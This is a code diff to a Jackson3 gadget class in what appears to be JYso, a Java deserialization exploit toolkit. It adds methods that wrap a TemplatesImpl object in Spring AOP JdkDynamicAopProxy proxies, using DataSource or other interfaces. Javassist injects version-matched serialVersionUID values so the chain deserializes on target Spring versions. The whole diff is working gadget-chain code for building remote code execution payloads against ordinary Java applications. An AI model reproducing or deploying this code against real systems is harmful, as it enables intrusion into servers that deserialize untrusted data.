@@ -5,12 +5,14 @@ import com.qi4l.JYso.gadgets.annotation.Authors;
 import com.qi4l.JYso.gadgets.annotation.Dependencies;
 import com.qi4l.JYso.gadgets.utils.Gadgets;
 import com.qi4l.JYso.gadgets.utils.SuClassLoader;
+import com.qi4l.JYso.gadgets.utils.ThirdLibsClassLoader;
 import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtMethod;
 import org.springframework.aop.framework.AdvisedSupport;
 import org.springframework.aop.framework.AdvisorChainFactory;
 
+import javax.sql.DataSource;
 import javax.xml.transform.Templates;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.InvocationHandler;
@@ -45,6 +47,39 @@ public class Jackson3 implements ObjectPayload<Object> {
         InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
         Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, handler);
 
+        return proxy;
+    }
+
+    public static Object makeDatasourceAopProxy(Object templatesImpl) throws Exception {
+        AdvisedSupport advisedSupport = new AdvisedSupport();
+        advisedSupport.setTarget(templatesImpl);
+
+        //<=6.0.23为6115154060221772279
+        //>=6.1.0 为273003553246259276
+        String sUID = "273003553246259276";
+        CtClass ctDefaultAdvisorChainFactory = insertField(
+                "org.springframework.aop.framework.DefaultAdvisorChainFactory",
+                "private static final long serialVersionUID = " + sUID + "L;");
+
+        Object ctFactory = ctDefaultAdvisorChainFactory.toClass(new SuClassLoader()).newInstance();
+        advisedSupport.setAdvisorChainFactory((AdvisorChainFactory) ctFactory);
+
+        Constructor<?> constructor = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy").getConstructor(AdvisedSupport.class);
+        constructor.setAccessible(true);
+        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
+        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{DataSource.class}, handler);
+        return proxy;
+    }
+
+    public static Object makeAopProxy(String singletonTargetSourceClassName, String advisedSupportClassName, String jdkDynamicAopProxy, Class superClass, Object targetObject) throws Exception {
+        Object singletonTargetSource = ThirdLibsClassLoader.loadClass_(singletonTargetSourceClassName).getConstructor(Object.class).newInstance(targetObject);
+        Class<?> advisedSupportClazz = ThirdLibsClassLoader.loadClass_(advisedSupportClassName);
+        Object advisedSupport = advisedSupportClazz.newInstance();
+        advisedSupportClazz.getMethod("setTarget", Object.class).invoke(advisedSupport, singletonTargetSource);
+        Constructor<?> constructor = ThirdLibsClassLoader.loadClass_(jdkDynamicAopProxy).getConstructor(advisedSupportClazz);
+        constructor.setAccessible(true);
+        InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport);
+        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{superClass}, handler);
         return proxy;
     }
 
